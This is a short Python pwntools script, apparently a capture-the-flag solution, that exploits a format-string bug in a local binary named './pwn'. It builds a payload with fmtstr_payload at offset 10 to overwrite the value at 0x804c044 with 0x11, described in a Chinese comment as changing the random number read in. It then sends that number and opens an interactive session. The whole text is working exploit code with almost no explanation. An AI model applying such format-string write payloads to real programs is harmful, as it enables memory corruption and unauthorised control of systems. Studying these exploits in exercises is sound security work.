from pwn import *

#修改读入的随机数

io=process("./pwn")

r_addr=0x804c044

payload=fmtstr_payload(10,{r_addr:0x11})

io.recv()

io.sendline(payload)

io.recv()

io.sendline(str(0x11))

io.interactive()

